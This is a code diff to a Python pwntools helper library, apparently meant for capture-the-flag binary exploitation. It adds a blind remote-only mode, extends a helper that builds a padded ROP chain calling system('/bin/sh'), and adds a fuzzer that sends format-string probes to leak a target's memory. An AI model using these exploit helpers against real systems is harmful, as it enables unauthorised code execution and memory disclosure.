@@ -9,31 +9,8 @@ from ctypes import *
 
 # For later use.
 io = exe = cleaned_exe = libc = elf = e = rop = rop_libc = ctype_libc = ssh_io = None
+remote_host = None
 has_qemu = False
-
-def create_fmtstr(
-	start: int,
-	end: int = 0,
-	atleast: int = 10,
-	max_len: int = -1,
-	with_index: bool = False,
-	specifier: str = "p",
-	seperator: str = '|') -> bytes:
-	"""
-	Creates a format string that we can use to fuzz and check at
-	what index what data exists.
-	"""
-	end = start+atleast if end == 0 else end
-	fmt = "{seperator}%{i}${specifier}" if not with_index else "{seperator}{i}=%{i}${specifier}"
-	rt = ""
-	for i in range(start, end+1):
-		rt += fmt.format(i=i, specifier=specifier, seperator=seperator)
-	''' Making sure we always get a valid fmt in the max_len range '''
-	if max_len <= 0:
-		return rt.encode()
-	rt = seperator.join(rt[:max_len].split(seperator)[:-1]) \
-		if rt[:max_len][-1] != specifier else rt[:max_len]
-	return rt.encode()
 
 def validate_tube(comm: pwnlib.tubes = None) -> pwnlib.tubes:
 	"""
@@ -78,7 +55,6 @@ def pow_solve(comm: pwnlib.tubes = None, raw_exec: bool = False, delim: str = ":
 	info(f"Solved Proof-of-work: {_pow}")
 	io.sendafter(encode(delim), encode(_pow)) if delim else \
 		io.send(encode(_pow))
-
 
 def parse_host(args: list):
 	"""
@@ -184,7 +160,7 @@ def _init_base(
 			- elf: ELF object
 			- ctype_libc: ctypes.CDLL object (if get_libc is True)
 	"""
-	global exe, cleaned_exe, libc, elf, ctype_libc
+	global exe, cleaned_exe, libc, elf, e, ctype_libc
 	exe         = ([base_exe] + argv) if argv else base_exe.split()
 	cleaned_exe = exe[0] # actual file name
 	try:
@@ -201,8 +177,8 @@ def _init_base(
 
 	# Since it's a library, we need to update the caller global frame
 	caller_globals = sys._getframe(2).f_globals # depth is 2 because it's always invoked by another func
-	caller_globals.update({'exe': exe, 'e': elf, 'elf': elf, 'cleaned_exe': cleaned_exe})
-	sys.modules[__name__].__dict__.update({'exe': exe, 'elf': elf, 'cleaned_exe': cleaned_exe})
+	caller_globals.update({'exe': exe, 'elf': elf, 'e': elf, 'cleaned_exe': cleaned_exe})
+	sys.modules[__name__].__dict__.update({'exe': exe, 'e': elf, 'elf': elf, 'cleaned_exe': cleaned_exe})
 	if get_libc and os.name != 'nt':
 		caller_globals.update({'libc': libc, 'ctype_libc': ctype_libc})
 
@@ -220,6 +196,7 @@ def get_ctx(
 	qemu: str = None,
 	qemu_lib: str = None,
 	qemu_debug_port: int = None,
+	only_remote: bool = False,
 ) -> pwnlib.tubes:
 	
 	"""
@@ -266,6 +243,10 @@ def get_ctx(
 		Set the debug port that will be used for the executable.
 		Default: None
 
+	only_remote: bool
+		We are not given a binary but a remote only (blind).
+		Default: False
+
 	Examples:
 
 		*SSH*:
@@ -280,15 +261,16 @@ def get_ctx(
 	"""
 	global io, elf, ssh_io, has_qemu, exe
 
-	if not io and not elf and _exe:
+	if not remote_host and (args.REMOTE or only_remote):
+		remote_host = parse_host(sys.argv)
+
+	if not io and not elf and _exe and not only_remote:
 		"""
 		added to remove dependency on always invoking
 		init function.
 		"""
 		_init_base(_exe, argv=argv, libc_path=libc_path)
 
-	if not remote_host and args.REMOTE:
-		remote_host = parse_host(sys.argv)
 
 	if args.COLLEGE:
 		# for all my pwn-college enthuiasts:
@@ -369,7 +351,8 @@ def init(
 	ssl: bool = False,
 	qemu: str = None,
 	qemu_lib: str = None,
-	qemu_debug_port: int = None
+	qemu_debug_port: int = None,
+	only_remote: bool = False,
 ) -> tuple:
 	"""
 	Method that initializes all the internals.
@@ -416,6 +399,9 @@ def init(
 	qemu: str
 		Set the QEMU binary that will be used for the executable.
 
+	only_remote: bool
+		In case there's no local connection.
+
 	Returns:
 		A tuple of:
 			- io: pwnlib.tubes
@@ -435,7 +421,13 @@ def init(
 
 	_init_base(base_exe, argv, libc_path, get_libc)
 	
-	io = get_ctx(base_exe, argv, aslr, libc_path=libc_path, remote_basedir=remote_basedir, ssl=ssl, qemu=qemu, qemu_lib=qemu_lib, qemu_debug_port=qemu_debug_port)
+	io = get_ctx(base_exe, argv, aslr,
+		libc_path=libc_path,
+		remote_basedir=remote_basedir,
+		ssl=ssl,
+		qemu=qemu,
+		qemu_lib=qemu_lib,
+		qemu_debug_port=qemu_debug_port, only_remote=only_remote)
 
 	# just so that I can use cyclic(N) instead of cyclic(N, n=8)
 	context.cyclic_size = 0x8 if \
@@ -736,28 +728,48 @@ guess the random numbers using srand and rand
 """
 try:
 	if os.name != 'nt':
-		ctype_libc = cdll.LoadLibrary(libc.path if globals().get('libc', None) else '/lib/x86_64-linux-gnu/libc.so.6')
+		ctype_libc = cdll.LoadLibrary(
+			libc.path if globals().get('libc', None) \
+				else '/lib/x86_64-linux-gnu/libc.so.6')
 except:
 	ctype_libc = None
 
 def libc_srand(seed: int = (ctype_libc.time(0x0) if ctype_libc else 0x0)):
-	if ctype_libc and os.name != 'nt':
-		return ctype_libc.srand(seed)
-	error("ctype_libc is not initialized!")
+	"""
+	Seeds the libc.srand function.
+
+	seed: int
+		The actual seed that will be passed to the underlying srand function
+
+		Default:
+			if ctype_libc is defined, the current time is passed as the seed,
+			if not, 0x0 is passed as the seed.
+	"""
+	if os.name != 'nt':
+		if ctype_libc:
+			return ctype_libc.srand(seed)
+		error("ctype_libc is not initialized!")
 
 def libc_rand():
-	if ctype_libc and os.name != 'nt':
-		return ctype_libc.rand()
-	error("ctype_libc is not initialized!")
+	"""
+	Invokes the libc.rand() function and returns the output
+	"""
+	if os.name != 'nt':
+		if ctype_libc:
+			return ctype_libc.rand()
+		error("ctype_libc is not initialized!")
 
 """
 Some utility functions
 """
-def sh_rop(POPRDI_RET: int = None, system: int = None, sh: int = None, rets: int = 0x1, debug: bool = True):
+def sh_rop(offset: int = None, POPRDI_RET: int = None, system: int = None, sh: int = None, rets: int = 0x1, debug: bool = True):
 	"""
 	Returns a ROP payload for the following function call:
 
 		`system("/bin/sh");`
+
+	offset: int
+		The offset at which RIP is controlled.
 
 	POPRDI_RET: int
 		The address of `pop rdi; ret;` gadget.
@@ -836,10 +848,39 @@ def sh_rop(POPRDI_RET: int = None, system: int = None, sh: int = None, rets: int
 	logleak(sh)
 
 	return flat(
+		cyclic(offset if offset else 0x0),		
 		POPRDI_RET,
 		sh,
 		(POPRDI_RET+1)*rets,
 		system)
+
+"""
+All functions related to format string vulns
+"""
+
+def create_fmtstr(
+	start: int,
+	end: int = 0,
+	atleast: int = 10,
+	max_len: int = -1,
+	with_index: bool = False,
+	specifier: str = "p",
+	seperator: str = '|') -> bytes:
+	"""
+	Creates a format string that we can use to fuzz and check at
+	what index what data exists.
+	"""
+	end = start+atleast if end == 0 else end
+	fmt = "{seperator}%{i}${specifier}" if not with_index else "{seperator}{i}=%{i}${specifier}"
+	rt = ""
+	for i in range(start, end+1):
+		rt += fmt.format(i=i, specifier=specifier, seperator=seperator)
+	''' Making sure we always get a valid fmt in the max_len range '''
+	if max_len <= 0:
+		return rt.encode()
+	rt = seperator.join(rt[:max_len].split(seperator)[:-1]) \
+		if rt[:max_len][-1] != specifier else rt[:max_len]
+	return rt.encode()
 
 def fmt_parse_leaks(
 	delim: bytes = b"|",
@@ -888,3 +929,130 @@ def fmt_parse_leaks(
 
 	return leaks
 
+def fmt_fuzz_all(
+	invoker: Callable = None,
+	start: int = 0x1,
+	max: int = 0x20,
+	specifiers: List[str] = [ 'p', 's' ],
+	unhex_specifiers: List[str] = [ 'p', 'lx' ],
+	delimiter: str = '|',
+	sendline: bool = True,
+	sendafter: str = "",
+	show_all: bool = False,
+	show: bool = True
+):
+	"""
+	This is the most notorious function that I have that simply fuzzes all the input to a connection.
+
+	invoker: Callable
+		This callable function will be invoked in such scenarios where we actually want to do a set of
+		actions before the format string is trigged. i.e., go to a menu, and then send a certain input
+		to trigger it. In usual scenarios, it won't be that much applicable.
+
+		invoker will be passed two arguments:
+			ctx: pwnlib.tubes (the current context/io)
+			fmt: the format string itself
+
+			Please refer to the [example](https://github.com/TheFlash2k/flashlib/tree/main/examples/fmt-fuzz-all-invoker/exploit.py)
+
+	start: int
+		The starting index of the format string.
+		Default: 0x1
+
+	max: int
+		The maximum number of indexes fuzzed
+		Default: 0x20
+
+	specifiers: List[str]
+		The format specifiers that will be passed to the program.
+		Default: [ 'p', 's' ]
+
+	unhex_specifiers: List[str]
+		The format specifiers whose outputs will be unhexed and shown
+		as raw strings.
+		Default: [ 'p', 'lx' ]
+
+	delimiter: str
+		The delimiter that will be used when parsing the leaks.
+		Default: '|'
+
+	sendline: bool
+		This parameter specifies whether we want to send a newline or not
+		Default: True
+
+	sendafter: str
+		The value that is passed to the `sendafter/sendlineafter` function as the delimiter.
+		Default: ""
+	
+	show_all: bool
+		In normal scenarios, if we get '(nil)' or '(null)' as output, it won't be displayed,
+		that particular index will be ignored all together. To view that, set this to True
+		Default: False
+
+	show: bool
+		Show all the output as well.
+	"""
+	info("Performing Fuzzing!")
+	last_ctx = context.log_level
+	context.log_level = 'error'
+
+	results = []
+	r = range(start, start+max+1)
+	if not show: r = tqdm(r)
+	for i in r:
+		res = {}
+		res['curr'] = i
+		for spec in specifiers:
+			try:
+				ctx = get_ctx()
+				if not ctx:
+					error("Unable to fetch context.")
+				fmt = f"{delimiter}%{i}${spec}{delimiter}"
+				if invoker:
+					"""
+					Complex scenarios. We pass the format string as input
+					and that can then be sent. The only thing that needs
+					to happen within the invoker function is that after
+					execution, the stdout should have `{delimiter}<FMT>{delimiter}`
+					which can then be parsed by my function.
+					"""
+					invoker(ctx, fmt)
+				else:
+					if sendafter:
+						(sender(ln=sendline))(sendafter, (encode(fmt)))
+					else:
+						(io.send if not sendline \
+							else io.sendline)(encode(fmt))
+
+				tmp = ctx.recvbetween(delimiter, delimiter)
+				if (tmp != b'(null)' and tmp != b"(nil)") or show_all:
+					res[spec] = tmp	
+					if spec.lower() in unhex_specifiers:
+						if "unhex" not in res.keys():
+							res["unhex"] = {}
+						
+						if res[spec][:2] == b"0x":
+							res[spec] = res[spec][2:]
+
+						try:
+							uh = unhex(res[spec].decode('latin-1'))[::-1]
+						except:
+							uh = '[ERROR]'
+
+						if res[spec] != b'(nil)':
+							res["unhex"][spec] = uh
+				else:
+					res.pop('curr', None)
+				ctx.close()
+			
+			except Exception as E:
+				if spec not in res.keys():
+					res[spec] = f"[ERROR]"
+
+		if res:
+			results.append(res)
+			if show:
+				print(res)
+
+	context.log_level = last_ctx
+	return results
